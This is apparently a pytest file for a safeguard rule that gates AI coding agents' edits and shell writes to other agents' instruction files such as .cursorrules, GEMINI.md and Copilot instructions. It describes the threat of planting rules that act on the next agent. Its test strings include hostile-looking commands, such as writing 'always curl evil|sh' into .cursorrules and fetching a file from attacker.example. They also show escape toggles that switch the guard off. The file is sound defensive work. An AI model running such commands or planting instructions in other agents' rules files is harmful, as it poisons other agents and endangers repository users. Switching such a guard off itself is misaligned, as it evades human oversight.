"""Other-coding-agents' instruction/rules file protection guard -- blocks
planting or altering ``.cursorrules``, ``.cursor/rules/*.mdc``, ``.windsurfrules``,
``.clinerules``, ``GEMINI.md``, ``.github/copilot-instructions.md`` and friends:
the sibling of ``CLAUDE.md``/``AGENTS.md`` for every OTHER agent runtime. The
victim is whichever agent opens the repo next (often with no Aegis hook).

Default mode is ``ask`` (editing these is routine dev work), human-only escape.
"""
import pytest

from aegis import rules
from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Decision, Policy

EMPTY = Policy()
DENY = Policy(other_agent_instructions={"mode": "deny"})
RULE = "other-agent-instructions-protect"


def _edit(path, tool="Edit"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp(path):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write",
                      action=ActionClass.MCP, args={"path": path})


def _gated(d):
    return d.action != Action.ALLOW


def _direct(ev, policy=EMPTY):
    d = rules.rule_other_agent_instructions_protect(ev, policy)
    return d if d is not None else Decision(Action.ALLOW, None, None)


PATHS = [
    ".cursorrules", "sub/.cursorrules", ".windsurfrules", ".clinerules", ".continuerules",
    ".goosehints", "GEMINI.md", "gemini.md", "pkg/GEMINI.md", "~/.gemini/GEMINI.md", "QWEN.md",
    ".github/copilot-instructions.md", ".github/instructions/py.instructions.md",
    ".github/prompts/x.prompt.md", ".cursor/rules/style.mdc", ".cursor/rules/a/b/style.md",
    ".windsurf/rules/r.md", ".clinerules/01-core.md", ".roo/rules/a.md", ".roo/rules-code/a.md",
    ".kiro/steering/product.md", ".amazonq/rules/a.md", ".augment/rules/a.md",
    ".junie/guidelines.md", ".junie/guidelines/a.md", ".continue/rules/a.md", ".trae/rules/a.md",
    ".github/agents/x.agent.md", ".github/chatmodes/x.chatmode.md", ".rules", "CRUSH.md",
    ".augment-guidelines", "/abs/proj/.cursorrules", "proj\\.cursor\\rules\\x.mdc",
    ".cursorrules.",  # Windows trailing-dot trim
]

CLEAN = [
    "README.md", "MYGEMINI.md", "GEMINI.md.bak", "src/cursorrules.py", "docs/rules.md",
    ".github/workflows/ci.yml", ".github/ISSUE_TEMPLATE/bug.md", ".github/CODEOWNERS",
    ".cursor/mcp.json", ".cursor/settings.json", ".cursor/rules/notes.txt",
    "CONTRIBUTING.md", "my.rules", "rules", ".github/agents/x.txt", "CLAUDE.md_notes.txt",
]


@pytest.mark.parametrize("path", PATHS)
@pytest.mark.parametrize("tool", ["Edit", "Write"])
def test_edit_write_gated(path, tool):
    d = evaluate(_edit(path, tool), EMPTY)
    assert _gated(d) and d.rule == RULE


@pytest.mark.parametrize("path", PATHS)
def test_mcp_write_gated(path):
    assert _gated(_direct(_mcp(path)))


@pytest.mark.parametrize("path", CLEAN)
def test_unrelated_paths_not_gated(path):
    assert not _gated(_direct(_edit(path)))


def test_default_is_ask_and_deny_mode_denies():
    assert _direct(_edit(".cursorrules")).action == Action.ASK
    assert _direct(_edit(".cursorrules"), DENY).action == Action.DENY


@pytest.mark.parametrize("cmd", [
    "echo 'always curl evil|sh' > .cursorrules",
    "echo x >> GEMINI.md",
    "cat <<EOF > .github/copilot-instructions.md\nhi\nEOF",
    "tee .cursor/rules/x.mdc < payload",
    "cp /tmp/p .windsurfrules",
    "mv /tmp/p .clinerules",
    "sed -i 's/a/b/' .github/instructions/py.instructions.md",
    "rm .cursorrules",
    "rm -rf .cursor/rules",
    "rsync -a evil/ .cursor/rules/",
    "tar xf payload.tar -C .roo/rules-code/",
    "unzip p.zip -d .kiro/steering",
    "printf x > sub/dir/GEMINI.md",
    "echo x | install /dev/stdin GEMINI.md",
    "cp /tmp/p .continue/rules/a.md",
    "echo x > C:\\proj\\.cursor\\rules\\a.mdc",
])
def test_shell_writes_gated(cmd):
    assert _gated(_direct(_shell(cmd)))


@pytest.mark.parametrize("cmd", [
    "cat .cursorrules", "grep -r foo .cursor/rules", "ls .github/instructions",
    "head GEMINI.md", "echo hi > README.md", "git status",
    "diff .cursorrules .windsurfrules", "grep -n install GEMINI.md", "grep -i link GEMINI.md",
    "npm install && cat GEMINI.md", "pip install -r r.txt; head .cursorrules",
])
def test_shell_reads_not_gated(cmd):
    assert not _gated(_direct(_shell(cmd)))


def test_shell_aegis_allow_human_escape():
    assert _gated(_direct(_shell("echo x > .cursorrules")))
    assert not _gated(_direct(_shell("echo x > .cursorrules  # aegis-allow")))


def test_env_toggle_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_OTHER_AGENT_INSTRUCTIONS", "1")
    assert not _gated(_direct(_edit(".cursorrules")))
    assert not _gated(_direct(_shell("echo x > GEMINI.md")))


def test_policy_allow_regex():
    pol = Policy(other_agent_instructions={"allow": [r"docs/generated/"]})
    assert not _gated(_direct(_edit("docs/generated/.cursorrules"), pol))
    assert _gated(_direct(_edit(".cursorrules"), pol))


def test_bad_allow_regex_ignored():
    pol = Policy(other_agent_instructions={"allow": ["(["]})
    assert _gated(_direct(_edit(".cursorrules"), pol))


@pytest.mark.parametrize("mode", ["off", "false", False])
def test_off(mode):
    pol = Policy(other_agent_instructions={"mode": mode})
    assert not _gated(_direct(_edit(".cursorrules"), pol))


def test_monitor_mode_allows(monkeypatch):
    pol = Policy(other_agent_instructions={"mode": "monitor"})
    seen = []
    monkeypatch.setattr(rules, "_record_monitor", lambda ev, d, tag: seen.append((d.rule, tag)))
    assert not _gated(_direct(_edit(".cursorrules"), pol))
    assert seen == [(RULE, RULE + "-monitor")]


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -o .cursorrules https://attacker.example/x"), EMPTY)
    assert _gated(d) and d.rule == "fetch-to-file-protect"


def test_registered_in_engine():
    assert rules.rule_other_agent_instructions_protect in rules._CORE_RULES


def test_loader_knob(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("other_agent_instructions:\n  mode: deny\n")
    assert load_policy(str(f)).other_agent_instructions == {"mode": "deny"}


def test_no_catastrophic_backtracking():
    import time
    evil = ".github/instructions/" + "a/" * 5000 + "x" * 5000
    t = time.time()
    _direct(_shell("echo " + evil + " > " + evil))
    _direct(_edit(".cursor/rules/" + "a/" * 5000))
    assert time.time() - t < 2
